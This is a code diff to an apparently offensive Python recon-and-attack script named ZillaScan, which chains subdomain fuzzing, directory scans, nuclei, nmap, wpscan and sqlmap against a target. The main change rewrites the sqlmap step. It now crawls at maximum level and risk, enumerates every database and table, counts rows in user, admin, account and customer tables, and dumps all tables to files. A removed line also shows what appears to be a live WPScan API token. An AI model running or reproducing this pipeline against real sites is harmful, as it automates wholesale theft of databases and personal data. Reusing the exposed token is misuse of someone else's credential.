@@ -22,7 +22,7 @@ ENABLE_WPSCAN_BRUTEFORCE = False  # WPScan brute-force is disabled by default
 def banner():
     print(r"""
 __________.__.__  .__           _________                     
-\____    /|__|  |  | _____   /   _____/ ____ _____    ____  
+\____    /|__|  | |  | _____   /   _____/ ____ _____    ____  
   /     / |  |  | |  | \__  \  \_____  \_/ ___\\__  \  /    \ 
  /     /_ |  |  |_|  |__/ __ \_/        \  \___ / __ \|   |  \
 /_______ \|__|____/____(____  /_______  /\___  >____  /___|  /
@@ -95,7 +95,6 @@ def clean_subdomains(file_path):
 
 # ---------------- Tool Wrappers ----------------
 def run_ffuf(target, output_dir):
-    # Correct domain extraction for FUZZ.target.com
     parsed = urlparse(target)
     domain = parsed.netloc
     if domain.startswith("www."):
@@ -159,40 +158,83 @@ def run_whatweb(target, output_dir):
     with SUMMARY_LOCK:
         OUTPUT_FILES.append(("Web Fingerprinting (WhatWeb)", whatweb_file))
 
-# ---------------- Updated SQLMap Function ----------------
+# ---------------- SQLMap Function (full dump + progress) ----------------
 def run_sqlmap(target, output_dir):
     base_dir = f"{output_dir}/sqlmap_{TIMESTAMP}"
     os.makedirs(base_dir, exist_ok=True)
 
     SENSITIVE_TABLES_REGEX = r"admin|admins|user|users|account|accounts|customer|customers|employee|employees|login|logins"
 
-    enum_dbs_cmd = f"sqlmap -u {target} --batch --level=2 --risk=2 --threads=10 --random-agent --dbs --output-dir={base_dir}"
+    # Step 1: Enumerate databases
+    enum_dbs_cmd = f"sqlmap -u {target} --batch --crawl=3 --level=3 --risk=3 --threads=10 --random-agent --dbs --output-dir={base_dir} -v 3"
     run(enum_dbs_cmd, "SQLMap Database Enumeration", live_output=True)
 
-    dbs = []
+    # Step 2: Parse databases from SQLMap log files
+    dbs = set()
     for root, dirs, files in os.walk(base_dir):
         for file in files:
-            if file.endswith(".sqlite"):
-                db_name = file.replace(".sqlite", "")
-                dbs.append(db_name)
+            if file.endswith(".txt") or file.endswith(".log"):
+                with open(os.path.join(root, file), "r", errors="ignore") as f:
+                    for line in f:
+                        match = re.search(r"available databases\s*\[(.*?)\]", line, re.IGNORECASE)
+                        if match:
+                            found = [db.strip() for db in match.group(1).split(",")]
+                            dbs.update(found)
+    dbs = sorted(dbs)
     REPORT_DATA["sqlmap"]["databases"] = dbs
+    print(f"[+] Databases found: {dbs}")
 
+    # Step 3: Enumerate tables
     db_tables = {}
-    for db in dbs:
-        enum_tables_cmd = f"sqlmap -u {target} --batch -D {db} --tables --output-dir={base_dir}"
+    sensitive_info = {}
+    target_folder = target.replace("://", "_")
+
+    for db_index, db in enumerate(dbs, start=1):
+        print(f"\n[+] Enumerating tables in database {db_index}/{len(dbs)}: {db}")
+        enum_tables_cmd = f"sqlmap -u {target} --batch -D {db} --tables --output-dir={base_dir} -v 3"
         output = run(enum_tables_cmd, f"Enumerate Tables in Database: {db}", live_output=True)
-        tables = re.findall(r"\|\s+(\w+)\s+\|", output)
-        db_tables[db] = tables
+
+        tables = set()
+        for line in output.splitlines():
+            line = line.strip()
+            table_match = re.match(r"\|\s*(\w+)\s*\|", line)
+            if table_match:
+                tables.add(table_match.group(1))
+        db_tables[db] = sorted(tables)
+        print(f"[+] Found {len(tables)} tables in {db}: {db_tables[db]}")
     REPORT_DATA["sqlmap"]["tables"] = db_tables
+
+    # Step 4: Dump all tables with progress
+    total_tables = sum(len(t) for t in db_tables.values())
+    current_table_num = 0
 
     for db, tables in db_tables.items():
         for table in tables:
+            current_table_num += 1
+            print(f"\n[+] Dumping table {current_table_num}/{total_tables}: {db}.{table}")
+
             if re.search(SENSITIVE_TABLES_REGEX, table, re.IGNORECASE):
-                dump_file = f"{base_dir}/dump_{db}_{table}.txt"
-                dump_cmd = f"sqlmap -u {target} --batch -D {db} -T {table} --dump --output-dir={base_dir} > {dump_file}"
-                run(dump_cmd, f"SQLMap Dump Table: {db}.{table}", live_output=True)
+                count_cmd = f"sqlmap -u {target} --batch -D {db} -T {table} --count --output-dir={base_dir} -v 3"
+                count_output = run(count_cmd, f"SQLMap Row Count for Table: {db}.{table}", live_output=True)
+                row_count = None
+                match = re.search(r"Table '.*?' has (\d+) entries", count_output)
+                if match:
+                    row_count = int(match.group(1))
+                sensitive_info[f"{db}.{table}"] = row_count
+                print(f"[+] Table {db}.{table} has {row_count} rows")
+
+            # Dump table
+            dump_cmd = f"sqlmap -u {target} --batch -D {db} -T {table} --dump --output-dir={base_dir} -v 3"
+            run(dump_cmd, f"SQLMap Dump Table: {db}.{table}", live_output=True)
+
+            internal_csv = os.path.join(base_dir, target_folder, "dump", db, f"{table}.csv")
+            if os.path.exists(internal_csv):
+                dump_file = os.path.join(base_dir, f"dump_{db}_{table}.txt")
+                shutil.copy(internal_csv, dump_file)
                 with SUMMARY_LOCK:
                     OUTPUT_FILES.append((f"SQLMap Dump: {db}.{table}", dump_file))
+
+    REPORT_DATA["sqlmap"]["sensitive_tables_info"] = sensitive_info
 
 def run_wpscan(target, output_dir):
     output_file = f"{output_dir}/wpscan_report_{TIMESTAMP}.txt"
@@ -204,7 +246,7 @@ def run_wpscan(target, output_dir):
         f"--ignore-main-redirect "
         f"--format cli "
         f"--output {output_file} "
-        f"--api-token ftxD76Ire0dxcOkj8NPMQjtqEjnqaBOXVLxPOT6hiVw"
+        f"--api-token [YOUR WPSCAN API TOKEN]"
     )
     run(cmd, "WPScan Vulnerability Scan", outfile=None, live_output=False)
 
@@ -267,29 +309,34 @@ def main():
         ("Harvester emails", harvester_emails_file)
     ])
 
-    tasks = [
-        ("Full Port and Service Scan (Nmap)", lambda: run(f"nmap -sC -sV -T4 -A -p- {domain}",
-                                                           "Full Port and Service Scan (Nmap)",
-                                                           f"{output_dir}/nmap_{TIMESTAMP}.txt")),
-        ("Ncat Banner Grab", lambda: [run(f"echo '' | ncat {domain} {port} -w 3",
-                                          f"Ncat Banner Grab Port {port}",
-                                          f"{output_dir}/ncat_{port}_{TIMESTAMP}.txt") for port in [21,22,25,80,110,143,443,3306,8080]]),
+    # ---------------- Run fast tools concurrently ----------------
+    fast_tasks = [
         ("FFUF Subdomain Fuzzing", lambda: run_ffuf(target, output_dir)),
         ("Gobuster Directory Scan", lambda: run_gobuster(target, output_dir)),
         ("Nuclei Scan", lambda: run_nuclei_scan(target, output_dir)),
         ("WhatWeb Fingerprinting", lambda: run_whatweb(target, output_dir)),
-        ("SQLMap Injection Scan", lambda: run_sqlmap(target, output_dir)),
         ("WPScan Vulnerability Scan", lambda: run_wpscan(target, output_dir))
     ]
 
-    with ThreadPoolExecutor(max_workers=6) as executor:
-        futures = {executor.submit(func): name for name, func in tasks}
+    with ThreadPoolExecutor(max_workers=5) as executor:
+        futures = {executor.submit(func): name for name, func in fast_tasks}
         for future in as_completed(futures):
             try:
                 future.result()
             except Exception as e:
                 print(f"[!] {futures[future]} failed: {e}")
 
+    # ---------------- Run slow tools sequentially ----------------
+    print("\n[+] Running Nmap (this may take a while)...")
+    run(f"nmap -sC -sV -T4 -A -p- {domain}",
+        "Full Port and Service Scan (Nmap)",
+        f"{output_dir}/nmap_{TIMESTAMP}.txt",
+        live_output=True)
+
+    print("\n[+] Running SQLMap (this may take a while)...")
+    run_sqlmap(target, output_dir)
+
+    # ---------------- Summary ----------------
     summary_file = f"{output_dir}/summary_{TIMESTAMP}.txt"
     with open(summary_file, "w") as f:
         f.write("==== ZillaScan Summary ====\n")
